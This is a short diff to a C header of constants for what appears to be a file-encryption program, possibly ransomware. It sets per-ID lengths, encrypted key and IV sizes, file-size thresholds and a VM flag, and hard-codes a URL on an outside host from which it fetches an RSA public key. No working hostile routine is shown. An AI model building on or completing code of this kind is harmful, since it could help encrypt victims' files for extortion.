@@ -27,8 +27,6 @@
 
 #define ID_LEN (256/8) // 256 bits
 
-#define BIG_FILE_BLOCK_SIZE (50 * 1L << 20);
-
 #define ENCRYPTED_KEY_IV_LEN (1024/8)
 
 #define URL_PUBLIC_RSA R"(https://squanchedhttpexample.azurewebsites.net/api/GetPublicKey?code=/JhagZr0xhT/CfqmBa/B0csng8kQKhPCXo7xjnfWJOD6P0sgITy4GQ==&&ID=)"
@@ -37,13 +35,15 @@
 #define FINISHED_ENCRYPTION '1'
 #define NOT_FINISHED_ENCRYPTION '0'
 
-#define VM 0
+#define VM 1
 
 /*
  * Size sum before removing the plaintext 
  * files that are currently decrypted
  */
-#define SIZE_THRESHOLD (107374182L*2)
+
+#define BIG_FILE_BLOCK_SIZE (50 * 1L << 20) // 50MB
+#define SIZE_THRESHOLD (107374182L*2) //200MB
 #define COUNT_THRESHOLD 1000
 #define MAX_FILE_SIZE 107374182L  // 100MB
 
